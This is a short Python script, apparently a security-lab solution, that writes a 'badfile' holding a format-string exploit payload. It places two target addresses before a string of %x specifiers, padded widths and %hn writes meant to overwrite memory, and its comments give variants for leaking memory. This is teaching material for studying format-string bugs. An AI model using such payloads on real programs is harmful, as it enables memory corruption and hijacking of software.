#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))
# This line shows how to store a 4-byte integer at offset 0
number  = 0x80E506A #0x080b4008 0xbfffeeee
content[0:4]  =  (number).to_bytes(4,byteorder='little')
# This line shows how to store a 4-byte string at offset 4
content[4:8]  =  ("@@@@").encode('latin-1')
number2= 0x080e5068 
content[8:12]  =  (number2).to_bytes(4,byteorder='little')

# This line shows how to construct a string s with
#  s% and offset between print and our buffer we go to the start of the buffer.
# s="%.8x"*70 to print out mem pat 2.A
#s= "%.8x"*63 + "%s" for part 2B 
# s= "%.8x"*63 + "%n" for part 3A
#s = "%325x"* 63 + "b"+ "%n" for 3B 
offset1= 0xAABB - 0x1fc + 267
offset2 = 0xCCDD - 0xAABB 

s = "%x" * 62 + "%." + str(offset1) + "x" + "%hn"  + "%." + str(offset2) + "x" + "%hn" 

# this writes the first count to the first address and the next

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[12:12+len(fmt)] = fmt
# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
